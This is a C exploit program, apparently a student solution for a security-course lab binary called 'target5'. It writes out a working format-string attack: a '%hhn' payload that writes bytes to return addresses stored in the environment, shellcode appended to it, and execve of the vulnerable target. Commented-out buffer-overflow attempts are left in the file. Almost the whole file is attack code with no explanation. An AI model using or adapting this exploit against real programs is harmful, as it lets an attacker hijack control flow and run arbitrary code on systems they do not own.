#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"
#define DEFAULT_BUFFER_SIZE  4
#define NOP 0x90
#define ZERO 0x00
int main(void)
{
  char *args[3];
  char *env[20	];
  int bsize = DEFAULT_BUFFER_SIZE;
  char* buff, *ptr;	
  /*
  if(!(buff = (char*)malloc(bsize * sizeof(char)))){
	  printf("can't allocate memory\n");
	  exit(0);	
  }

  unsigned long *add_ptr;
*/
  int i;
/*
 for (i = 0; i < 60; i++){
	  buff[i] = 'A';
  }
  */

  //ptr = buff + 60;
  

	
  int count = 0;

  char * s = "\x68\xfe\xa4\x40";
  /*
  while(*s){
 	 *ptr++ = *s++;
	 count++;
  }
  */
  /*
  ptr = ptr + 12;
  char* s1 = "\x69\xfe\xa4\x40";
  while(*s1){
 	 *ptr++ = *s1++;
	 count++;
  }
  ptr = ptr + 12;
  char* s2 = "\x70\xfe\xa4\x40";
  while(*s2){
 	 *ptr++ = *s2++;
	 count++;
  }
  ptr = ptr + 12;
  char* s3 = "\x71\xfe\xa4\x40";
  while(*s3){
 	 *(ptr++) = *(s3++);
	 count++;
  }


  ptr = buff + 60 + 56 ;
  for (i=0; i< strlen(shellcode); i++){
  	*(ptr++) = shellcode[i];
	
  }

  ptr = buff + 60 + 56 + strlen(shellcode);
  
  while(*r){
 	 *(ptr++) = *(r++);
	 
  }
 */

  //printf("the length of buff after concatenating is %d\n ",strlen(buff));
  //printf("the buff after concatenating is %s\n ",buff);

  args[0] = TARGET; 
  args[1] = s;
  args[2] = NULL;
  char* r = "%08x%08x%08x%08x%78u%hhn%97u%hhn%171u%hhn%156u%hhn";
  //char* r = "%08x%08x%08x%08x%78u";
  //char* r = "%111x";
  //char* r = "%08x.%08x.%08x.%08x.%08x.%n.%08x.%08x.%08.%08x.%08x.%08x.%08x.%08x\n";
  env[0] = "\x00";
  env[1] = "\x00";
  env[2] = "\x00";
  env[3] = "AAAAAAA";
  env[4] = "\x69\xfe\xa4\x40";
  env[5] = "\x00";
  env[6] = "\x00";
  env[7] = "\x00";
  env[8] = "AAAAAAA";
  env[9] = "\x70\xfe\xa4\x40";
  env[10] = "\x00";
  env[11] = "\x00";
  env[12] = "\x00";
  env[13] = "AAAAAAA";
  env[14] = "\x71\xfe\xa4\x40";
  env[15] = "\x00";
  env[16] = "\x00";
  env[17] = "\x00";
  env[18] = strcat(shellcode,r);
  //env[18] = r;
  /*
  for (i = 0; i<41; i++){
	if (i == 4) env[i] = "\x69\xfe\xa4\x40";
	else if (i == 23) env[i] = "\x70\xfe\xa4\x40";
	else if (i == 35) env[i] = "\x71\xfe\xa4\x40";
	else if (i == 8) env[i] = "AAAAAAAA";
	else if (i == 39) env[i] = shellcode;
	else if (i == 40) env[i] = r;
	else env[i] = "\x00";
	
  }
*/
  char * nop;
   if(!(nop = (char*)malloc(150 * sizeof(char)))){
	  printf("can't allocate memory\n");
	  exit(0);	
  }
  for (i = 0; i<150; i++){
  	nop[i] = 'A';
  }
  
  printf("%s",nop);
  env[19] = nop;
  

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
